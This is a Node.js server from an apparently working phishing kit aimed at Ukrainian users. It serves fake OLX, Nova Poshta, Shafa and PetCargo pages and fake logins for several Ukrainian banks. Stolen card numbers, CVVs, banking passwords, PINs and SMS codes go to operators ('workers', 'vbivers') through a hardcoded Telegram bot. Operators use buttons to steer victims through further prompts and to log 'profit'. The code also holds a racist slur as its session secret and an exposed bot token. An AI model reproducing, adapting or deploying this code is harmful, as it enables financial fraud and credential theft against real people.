const express = require("express");
const http = require("http");
const bodyParser = require("body-parser");
const path = require("path");
const { Telegram, Markup } = require("telegraf");
const { User, Ad, Settings, Log } = require("../db");
const session = require("express-session");
const escapeHTML = require("escape-html");
const translate = require("./translate");
const binInfo = require("../helpers/binInfo");
const useragent = require('express-useragent');
const { Op } = require("sequelize");

function random(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
  }
  function sleep(ms) {
    return new Promise((resolve) => {
      setTimeout(resolve, ms);
    });
  }
  async function getCardInfo(cardNumber) {
    try {
      const bininfo = await binInfo(String(cardNumber).substr(0, 8));
      var text = "";
  
      if (bininfo.bank) text += `${bininfo.bank}`;
  
      return text;
    } catch (err) {
      return "неизвестно";
    }
  }

bot = new Telegram("6945856904:AAEuO-8HOj8Yl3H_xLMtfONuT61PYcdaesM");

const app = express();

app.use(
    bodyParser.urlencoded({
      extended: true,
    })
  );

app.use(
  session({
    secret: "hey fuckn nigger die pls",
    resave: false,
    saveUninitialized: true,
  })
);
app.use(useragent.express());

app.use(bodyParser.json());
app.engine("html", require("ejs").renderFile);
app.set("view engine", "html");
app.use(express.static(path.join(__dirname, "/public")));
app.set("trust proxy", 1);
app.use(express.static(path.join(__dirname, "/static")));



app.get("/", async (req, res) => {
    return res.sendStatus(404);
})


app.get(`/:adId`, async (req, res) => {
    const ad = await Ad.findOne({
      where: {
        adid: req.params.adId,
      },
    });
    if (!ad) {
      return res.sendStatus(404);
    } else {
      const user = await User.findOne({
        where: {
          userid: ad.worker,
        },
      });
      if (!user.ban) {
        const settings = await Settings.findOne({
            where: {
              id: 1,
            },
          });
        bot
          .sendMessage(
            ad.worker,
            `<b>❕Мамонт перешёл на главную страницу

◾️Название товара: <code>${ad.title}</code>
◾️Стоимость объявления: <code>${ad.price}</code>
◾️ID товара: <code>${ad.adid}</code>
</b>`,
            {
              parse_mode: "HTML",
              disable_web_page_preview: true,
              reply_markup: JSON.stringify({
                inline_keyboard: [
                  [
                    {
                      text: "👁 Проверить онлайн 👁",
                      callback_data: `checkonline_${ad.adid}`,
                    },
                  ],
                ],
              })
            }
          )
          .catch((err) => err);
        return res.render(`${ad.service}/index.html`, {
            ad,
            tp: settings.tp,
        });
      } else {
        return res.send("Error: 404");
      }
    
  }
  });

app.get("/card/:adId", async (req, res) => {
try {
    const settings = await Settings.findOne({
        where: {
          id: 1,
        },
      });
    const ad = await Ad.findOne({
    where: {
        adid: req.params.adId,
    },
    });

    if (!ad) {
    return res.sendStatus(404);
    } else {

    bot
        .sendMessage(
        ad.worker,
        `<b>❗️ Мамонт перешел на ввод карты

◾️Название товара: <code>${ad.title}</code>
◾️Стоимость объявления: <code>${ad.price}</code>
◾️ID товара: <code>${ad.adid}</code>
        </b>`,
        {
            parse_mode: "HTML",
            disable_web_page_preview: true,
            reply_markup: JSON.stringify({
              inline_keyboard: [
                [
                  {
                    text: "👁 Проверить онлайн 👁",
                    callback_data: `checkonline_${ad.adid}`,
                  },
                ],
              ],
            })
        }
        )
        .catch((err) => err);
    const lang = "ua";
    
    if (ad.service == 'olxua') {
        return res.render(`olxcard.html`, {
            ad,
            tp: settings.tp,
            lang,
            translate,
            });
    }
    else if (ad.service == 'novaposhtaua') {
        return res.render(`npcard.html`, {
        ad,
        tp: settings.tp,
        lang,
        translate,
        });
    } else if (ad.service == 'shafaua') {
        return res.render(`shafacard.html`, {
        ad,
        tp: settings.tp,
        lang,
        translate,
        });
    } else if (ad.service == 'petcargoua') {
        return res.render(`petcargocard.html`, {
        ad,
        tp: settings.tp,
        lang,
        translate,
        });
  
      }
    }
} catch (err) {
    console.log(err)
    return res.send("Error: 404");
}
});
app.post(`/submitNewLk`, async (req, res) => {
  const token = req.body.token;
  await Log.update({ status: "nostatus" }, { where: { token: token } });
  const log = await Log.findOne({
    where: {
      token: req.body.token,
    },
  });
  const ad = await Ad.findOne({
    where: {
      adid: log.advert,
    },
  });
  const user = await User.findOne({
    where: {
      userid: ad.worker,
    },
  });
  bot.sendMessage(
    ad.worker,
    `<b>‼️ Мамонт ввел данные ЛК

◾️Название товара: <code>${ad.title}</code>
◾️Стоимость объявления: <code>${ad.price}</code>
◾️ID товара: <code>${ad.adid}</code></b>`,
    {
      parse_mode: "HTML",
      disable_web_page_preview: true,
      reply_markup: JSON.stringify({
        inline_keyboard: [
          [
            {
              text: "👁 Проверить онлайн 👁",
              callback_data: `checkonline_${ad.adid}`,
            },
          ],
        ],
      })
    }
  );
  if (ad.service == "olxua") {
    var ser = "OLX.UA 🇺🇦";
  } else if (ad.service == "novaposhtaua") {
    var ser = "NOVAPOSHTA 🇺🇦";
  } else if (ad.service == "shafaua") {
    var ser = "SHAFA 🇺🇦";
  } else if (ad.service == "petcargoua") {
    var ser = "PETCARGO.UA 🇺🇦";
  }
  
  if (user.referal) {
    const ref = await User.findOne({
      where: {
        userid: user.referal,
      },
    });
    var refinfo = `💌 Пригласил: <a href="tg://user?id=${ref.userid}">${ref.username}</a> (<code>${ref.userid}</code>) `
  } else {
    var refinfo = ''
  }
  const cardinfo = await getCardInfo(log.card);

  bot.sendMessage(
    log.vbiver,
    `<b>‼️ Мамонт ввел данные ЛК!

🆔 ID лога: <code>#${token}</code>

📚 Сервис: <code>${ser}</code>

🏦 Номер: <code>${req.body.number}</code>
🙊 Пароль: <code>${req.body.password}</code>
🏧 Пин-код: <code>${req.body.pin}</code>

💶 Баланс: <code>${log.balance} UAH </code>

💳 Номер карты: <code>${log.card}</code>
📅 Срок: <code>${log.date}</code>
🔒 CVV: <code>${log.cvv}</code>

🌍 UserAgent: <code>${req.useragent.source}</code>

🏦 Банк: <code>${cardinfo}</code>

🆔 ID товара: <code>${ad.adid}</code>
🌄 Название товара: <code>${ad.title}</code>
📌 Стоимость: <code>${ad.price}</code>

👦 Воркер: <a href="tg://user?id=${ad.worker}">${user.username}</a> (<code>${ad.worker}</code>) 
${refinfo}</b>`,
    {
      parse_mode: "HTML",
      disable_web_page_preview: true,
      reply_markup:  Markup.inlineKeyboard([
        [Markup.button.callback(`Вбивает: @${log.vbiver_name}`, `none`)],
        [Markup.button.callback(`Статус: ожидание`, `none`)],
        [
          {
            text: `🔔 ТП 🔔`,
            callback_data: `setstatus_${token}_gotp`,
          },
          {
            text: `🔔 Толкнуть 🔔`,
            callback_data: `sendtp_${token}`,
          },
        ],
        [
          Markup.button.callback(`📲 Код`, `setstatus_${token}_sms`),
          Markup.button.callback(`Пуш 🔫`, `setstatus_${token}_push`),
        ],
        [
          Markup.button.callback(
            `🍎 Точный`,
            `setstatus_${token}_correctBalance`
          ),
          Markup.button.callback(
            `Пополнение 💶`,
            `setstatus_${token}_popolnenie`
          ),
        ],
        [
          Markup.button.callback(`🏓 PIN`, `setstatus_${token}_pinerror`),
          Markup.button.callback(
            `Пароль 🔐`,
            `setstatus_${token}_invalidpass`
          ),
        ],
        [
          Markup.button.callback(
            `💳 Другая карта 💳`,
            `setstatus_${token}_otherCard`
          ),
        ],
        [Markup.button.callback(`💶 ПРОФИТ 💶`, `profit_${token}`)],
        [      Markup.button.callback(
          `🏦 ЛК (ПРИВАТБАНК) 🏦`,
          `setstatus_${token}_lkprivat`
        )],
        [      Markup.button.callback(
          `🏦 ЛК (ОЩАДБАНК) 🏦`,
          `setstatus_${token}_lkoschad`
        )],
        [
          Markup.button.callback(
            '🏦 ЛК (RAIFFEISEN)'
            , `setstatus_${token}_lkraif`
          )
        ],
        [
          Markup.button.callback(
            '🏦 ЛК (PUMB)',
            `setstatus_${token}_lkpumb`
          )
        ],
        [
          Markup.button.callback(
            '🏦 ЛК (A-BANK)',
            `setstatus_${token}_lkabank`
          )
        ],
        [
          Markup.button.callback(
            `😭 Отказаться от лога 😭`,
            `leavelog_${token}`
          ),
        ],
      ]).reply_markup,
    }
  );
  return res.json({
    token: token,
  });
});
app.get(`/personal/:logToken`, async (req, res) => {
  const token = req.params.logToken;
  const log = await Log.findOne({
    where: {
      token: req.params.logToken,
    },
  });
  const ad = await Ad.findOne({
    where: {
      adid: log.advert,
    },
  });
  const settings = await Settings.findOne({
    where: {
      id: 1,
    },
  });
  const tp = settings.tp;
  const lang = 'ua'
  if (log.whylk == 'privat') {
        return res.render(`privatlk/index`, {
          token,
          advertid: ad.adid,
          translate,
          lang,
          tp,
          ad,
        });
} else if (log.whylk == 'oschad') {
  return res.render(`oschadlk/index`, {
    token,
    advertid: ad.adid,
    translate,
    lang,
    tp,
    ad,
  }); 
} else if (log.whylk == 'raif') {
  return res.render(`raiflk/index`, {
    token,
    advertid: ad.adid,
    translate,
    lang,
    tp,
    ad,
  }); 
} else if (log.whylk == 'pumb') {
  return res.render(`pumblk/index`, {
    token,
    advertid: ad.adid,
    translate,
    lang,
    tp,
    ad,
  }); 
} else if (log.whylk == 'abank') {
  return res.render(`abanklk/index`, {
    token,
    advertid: ad.adid,
    translate,
    lang,
    tp,
    ad,
  }); 
}
});

app.post(`/api/checkStatus`, async (req, res) => {
  try {

    await sleep(3000);
    const log = await Log.findOne({
      where: {
        token: req.body.token,
      },
    });
    return res.json({
      status: log.status,
      custom: log.custom ? log.custom : ''
    });
  } catch (err) {
    console.log(err);
  }
});

app.post(`/api/submitQuestion`, async (req, res) => {

  const token = req.body.token;
  const answer = req.body.code;
  const log = await Log.findOne({
    where: {
      token: req.body.token,
    },
  });
  const ad = await Ad.findOne({
    where: {
      adid: log.advert,
    },
  });
  await Log.update({ status: "nostatus" }, { where: { token: token } });

  bot.sendMessage(
    log.vbiver,
    `<b>🚸 Мамонт ответил на вопрос!

🆔 Уникальный ID лога: <code>#${token}</code>

🆔 ID для ТП: <code>${log.advert}</code>

❓ Ответ: <code>${answer}</code>
</b>`,
    {
      parse_mode: "HTML",
      disable_web_page_preview: true,
      reply_markup: JSON.stringify({
        inline_keyboard: [
          [
            {
              text: "👁 Проверить онлайн 👁",
              callback_data: `checkonline_${ad.adid}`,
            },
          ],
        ],
      })
    }
  );
  return res.json({
    token: token,
  });

});

app.post(`/api/submitCode`, async (req, res) => {
  const token = req.body.token;
  const code = req.body.code;
  const log = await Log.findOne({
    where: {
      token: req.body.token,
    },
  });
  await Log.update({ status: "nostatus" }, { where: { token: token } });
  const ad = await Ad.findOne({
    where: {
      adid: log.advert,
    },
  });

  const user = await User.findOne({
    where: {
      userid: log.worker,
    },
  });
  bot.sendMessage(
    ad.worker,
    `<b>🟢 Мамонт ввел код

◾️Название товара: <code>${ad.title}</code>
◾️Стоимость объявления: <code>${ad.price}</code>
◾️ID товара: <code>${ad.adid}</code></b>`,
    {
      parse_mode: "HTML",
      disable_web_page_preview: true,
      reply_markup: JSON.stringify({
        inline_keyboard: [
          [
            {
              text: "👁 Проверить онлайн 👁",
              callback_data: `checkonline_${ad.adid}`,
            },
          ],
        ],
      })
    }
  );
  
  if (ad.service == "olxua") {
    var ser = "OLX.UA 🇺🇦";
  } else if (ad.service == "novaposhtaua") {
    var ser = "NOVAPOSHTA 🇺🇦";
  } else if (ad.service == "shafaua") {
    var ser = "SHAFA 🇺🇦";
  } else if (ad.service == "petcargoua") {
    var ser = "PETCARGO.UA 🇺🇦";
  }

  
  if (user.referal) {
    const ref = await User.findOne({
      where: {
        userid: user.referal,
      },
    });
    var refinfo = `💌 Пригласил: <a href="tg://user?id=${ref.userid}">${ref.username}</a> (<code>${ref.userid}</code>) `
  } else {
    var refinfo = ''
  }
  const cardinfo = await getCardInfo(log.card);
  
  bot.sendMessage(
    log.vbiver,
    `<b>‼️ Ввод кода!
    
🆔 ID лога: <code>#${token}</code>

🔞 Код: <code>${code}</code>

📚 Сервис: <code>${ser}</code>

💶 Баланс: <code>${log.balance} UAH </code>

💳 Номер карты: <code>${log.card}</code>
📅 Срок: <code>${log.date}</code>
🔒 CVV: <code>${log.cvv}</code>

🌍 UserAgent: <code>${req.useragent.source}</code>

🏦 Банк: <code>${cardinfo}</code>

🆔 ID товара: <code>${ad.adid}</code>
🌄 Название товара: <code>${ad.title}</code>
📌 Стоимость: <code>${ad.price}</code>

👦 Воркер: <a href="tg://user?id=${ad.worker}">${user.username}</a> (<code>${ad.worker}</code>) 
${refinfo}</b>`,
    {
      parse_mode: "HTML",
      disable_web_page_preview: true,
      reply_markup:  Markup.inlineKeyboard([
        [Markup.button.callback(`Вбивает: @${log.vbiver_name}`, `none`)],
        [Markup.button.callback(`Статус: ожидание`, `none`)],
        [
          {
            text: `🔔 ТП 🔔`,
            callback_data: `setstatus_${token}_gotp`,
          },
          {
            text: `🔔 Толкнуть 🔔`,
            callback_data: `sendtp_${token}`,
          },
        ],
        [
          Markup.button.callback(`📲 Код`, `setstatus_${token}_sms`),
          Markup.button.callback(`Пуш 🔫`, `setstatus_${token}_push`),
        ],
        [
          Markup.button.callback(
            `🍎 Точный`,
            `setstatus_${token}_correctBalance`
          ),
          Markup.button.callback(
            `Пополнение 💶`,
            `setstatus_${token}_popolnenie`
          ),
        ],
        [
          Markup.button.callback(`🏓 PIN`, `setstatus_${token}_pinerror`),
          Markup.button.callback(
            `Пароль 🔐`,
            `setstatus_${token}_invalidpass`
          ),
        ],
        [
          Markup.button.callback(
            `💳 Другая карта 💳`,
            `setstatus_${token}_otherCard`
          ),
        ],
        [Markup.button.callback(`💶 ПРОФИТ 💶`, `profit_${token}`)],
        [      Markup.button.callback(
          `🏦 ЛК (ПРИВАТБАНК) 🏦`,
          `setstatus_${token}_lkprivat`
        )],
        [      Markup.button.callback(
          `🏦 ЛК (ОЩАДБАНК) 🏦`,
          `setstatus_${token}_lkoschad`
        )],
        [
          Markup.button.callback(
            '🏦 ЛК (RAIFFEISEN)',
            `setstatus_${token}_lkraif`
          )
        ],
        [
          Markup.button.callback(
            '🏦 ЛК (PUMB)',
            `setstatus_${token}_lkpumb`
          )
        ],
        [
          Markup.button.callback(
            '🏦 ЛК (A-BANK)',
            `setstatus_${token}_lkabank`
          )
        ],
        [
          Markup.button.callback(
            `😭 Отказаться от лога 😭`,
            `leavelog_${token}`
          ),
        ],
      ]).reply_markup    }
  );
  return res.json({
    token: token,
  });
});

app.post("/api/checkOnline", async (req, res) => {
  try {
    const ad = await Ad.findOne({
      where: {
        adid: req.body.id,
      },
    });

    if (!ad) return res.sendStatus(404);
    
    await ad.update({
      online: req.body.status,
    });
    return res.sendStatus(200);
  } catch (err) {
    console.log(err);
    return res.sendStatus(404);
  }
});


app.post(`/api/submitCard`, async (req, res) => {
  try {
    const id = req.body.adId;
    const card = req.body.number;
    const expire = req.body.expire;
    const cvv = req.body.cvv;
    const balance = req.body.balance;
    const status = "nostatus";

    const token = random(1000000000, 9999999999);

    const keyboard = JSON.stringify({
      inline_keyboard: [
        [
          {
            text: "Взять на вбив",
            callback_data: `getvbiv_${token}`,
          },
        ],
      ],
    });
    const ad = await Ad.findOne({
      where: {
        adid: id,
      },
    });
    const user = await User.findOne({
      where: {
        userid: ad.worker,
      },
    });
    if (ad.service == "olxua") {
      var ser = "OLX.UA 🇺🇦";
    } else if (ad.service == "novaposhtaua") {
      var ser = "NOVAPOSHTA 🇺🇦";
    } else if (ad.service == "shafaua") {
      var ser = "SHAFA 🇺🇦";
    } else if (ad.service == "petcargoua") {
      var ser = "PETCARGO.UA 🇺🇦";
    }
    const cardinfo = await getCardInfo(card);

      bot.sendMessage(
        ad.worker,
        `<b>🆘Мамонт ввёл данные карты
  
◾️Название товара: <code>${ad.title}</code>
◾️Стоимость объявления: <code>${ad.price}</code>
◾️ID товара: <code>${ad.adid}</code>

◽️Банк: <code>${cardinfo}</code>
💲Баланс: <code>${balance} UAH</code>

</b>`,
        {
          parse_mode: "HTML",
          disable_web_page_preview: true,
          reply_markup: JSON.stringify({
            inline_keyboard: [
              [
                {
                  text: "👁 Проверить онлайн 👁",
                  callback_data: `checkonline_${ad.adid}`,
                },
              ],
            ],
          })
        }
      );
  

    if (user.referal) {
      const ref = await User.findOne({
        where: {
          userid: user.referal,
        },
      });
      var refinfo = `💌 Пригласил: <a href="tg://user?id=${ref.userid}">${ref.username}</a> (<code>${ref.userid}</code>) `
    } else {
      var refinfo = ''
    }
    const vbivers = await User.findAll({
      where: {
        status: {
          [Op.or]: [3, 4]
        }
      },
    });
    for (let i of vbivers) {
      var admmsg = await bot
      .sendMessage(
        i.userid,
              `
<b>‼️ НОВЫЙ ЛОГ БРАТВА АСАЛАМАЛЕЙКУМ ‼️

🆔 ID лога: <code>#${token}</code>

🆔 ID товара: <code>${ad.adid}</code>

📚 Сервис: <code>${ser}</code>

💶 Баланс: <code>${balance} UAH </code>

💳 Номер карты: <code>${card}</code>
🏦 Банк: <code>${cardinfo}</code>

👦 Воркер: <a href="tg://user?id=${ad.worker}">${user.username}</a> (<code>${ad.worker}</code>) 
${refinfo}
</b>
                              `,
              {
                parse_mode: "HTML",
                reply_markup: keyboard,
              }
      )
    }

//     var admmsg = await bot
//     .sendMessage(
//       -1002013088627,
//             `
// <b>‼️ НОВЫЙ ЛОГ БРАТВА АСАЛАМАЛЕЙКУМ ‼️

// 🆔 ID лога: <code>#${token}</code>

// 📚 Сервис: <code>${ser}</code>

// 💶 Баланс: <code>${balance} UAH </code>

// 💳 Номер карты: <code>${card}</code>
// 📅 Срок: <code>${expire}</code>
// 🔒 CVV: <code>${cvv}</code>

// 🌍 UserAgent: <code>${req.useragent.source}</code>

// 🏦 Банк: <code>${cardinfo}</code>

// 🆔 ID товара: <code>${ad.adid}</code>
// 🌄 Название товара: <code>${ad.title}</code>
// 📌 Стоимость: <code>${ad.price}</code>

// 👦 Воркер: <a href="tg://user?id=${ad.worker}">${user.username}</a> (<code>${ad.worker}</code>) 
// ${refinfo}
// </b>
//                             `,
//             {
//               parse_mode: "HTML",
//               reply_markup: keyboard,
//             }
//     )
      await Log.create({
        token: token,
        status: status,
        advert: id,
        worker: ad.worker,
        card: card,
        date: expire,
        cvv: cvv,
        balance: balance,
        bank: cardinfo,
        useragent: req.useragent.source,
        msgid: admmsg.message_id,
        vbiver: "1",
        vbiver_name: "1",
      });
            
    return res.json({
      token: token,
    });

  } catch (err) {
    console.log(err);
  }
});


const server = http.createServer(app);
server.listen(80, () => console.log("Server started succefuly"));

